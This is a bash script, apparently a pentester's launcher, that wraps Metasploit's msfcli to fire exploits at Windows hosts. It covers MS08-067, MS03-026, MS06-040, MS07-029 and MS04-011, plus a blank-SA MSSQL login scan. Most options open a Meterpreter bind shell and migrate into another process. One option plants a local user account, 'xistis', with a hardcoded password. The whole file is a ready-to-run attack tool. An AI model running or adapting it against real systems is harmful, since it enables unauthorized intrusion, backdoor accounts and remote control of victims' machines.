#!/bin/bash
#Script to launch metasploit exploits for common windows vulnerabilities and bind shell
#Usage ./script port
# TODO implement favorite modules feature
if [ $# -eq 0 ]; then
echo -e "\033[1m----------------------------------------\033[0m"
echo -e "\033[1m.######..######..######...####...##..##.\033[0m"
echo -e "\033[1m.##......##........##....##..##..##..##.\033[0m"
echo -e "\033[1m.####....####......##....##......######.\033[0m"
echo -e "\033[1m.##......##........##....##..##..##..##.\033[0m"
echo -e "\033[1m.##......######....##.....####...##..##.\033[0m"
echo -e "\033[1m........................................\033[0m"
echo -e "\033[1m[*]Usage: $0 <target> <bind_port> <exploit>\033[0m"
echo -e "\033[1m[1]MS08_067 [great]\033[0m"
echo -e "\033[1m[2]MS03_026_dcom [great]- \033[0m"
echo -e "\033[1m[3]MS06_040_netapi [great] Payload add user \033[0m"
echo -e "\033[1m[4]MS07_029_msdns_zonename [great for DCs]\033[0m"
echo -e "\033[1m[5]MS04_011_lsass [great]\033[0m"
echo -e "\033[1m[6]mssql module\033[0m"
exit
fi

bport=$2
target=$1
exploit=$3

echo -e "\033[1m----------------------------------------\033[0m"
echo -e "\033[1m.######..######..######...####...##..##.\033[0m"
echo -e "\033[1m.##......##........##....##..##..##..##.\033[0m"
echo -e "\033[1m.####....####......##....##......######.\033[0m"
echo -e "\033[1m.##......##........##....##..##..##..##.\033[0m"
echo -e "\033[1m.##......######....##.....####...##..##.\033[0m"
echo -e "\033[1m........................................\033[0m"


if [ $exploit == '1' ];
then
echo -e "\033[1m[*]Executing Exploit:ms08_067_netapi against $target\033[0m"
msfcli exploit/windows/smb/ms08_067_netapi RHOST=$target LPORT=$bport InitialAutoRunScript="migrate -f" PAYLOAD=windows/meterpreter/bind_tcp E
fi

if [ $exploit == '2' ];
then
echo -e "\033[1m[*]Executing Exploit:ms03_026_dcom against $target\033[0m"
msfcli exploit/windows/dcerpc/ms03_026_dcom RHOST=$target LPORT=$bport InitialAutoRunScript="migrate -f" PAYLOAD=windows/meterpreter/bind_tcp E
fi 

if [ $exploit == '3' ];
then
echo -e "\033[1m[*]Executing Exploit:ms06_040_netapi against $target , adduser xistis:Password12345! \033[0m"
msfcli exploit/windows/smb/ms06_040_netapi RHOST=$target LPORT=$bport PAYLOAD=windows/adduser USER=xistis PASS=Password12345! E
fi 

if [ $exploit == '4' ];
then
echo -e "\033[1m[*]Executing Exploit:msdns_zonename against $target\033[0m"
msfcli exploit/windows/dcerpc/ms07_029_msdns_zonename RHOST=$target InitialAutoRunScript="migrate -f" LPORT=$bport PAYLOAD=windows/meterpreter/bind_tcp E
fi 

if [ $exploit == '5' ];
then
echo -e "\033[1m[*]Executing Exploit:ms04_011_lsass against $target\033[0m"
msfcli exploit/smb/ms04_011_lsass RHOST=$target LPORT=$bport InitialAutoRunScript="migrate -f" PAYLOAD=windows/meterpreter/bind_tcp E
fi 

if [ $exploit == '6' ];
then
echo -e "\033[1m[*]Executing Exploit:mssql_login (testing blank SA) against $target\033[0m"
msfcli auxiliary/scanner/mssql/mssql_login RHOSTS=$target RPORT=$bport E
fi 

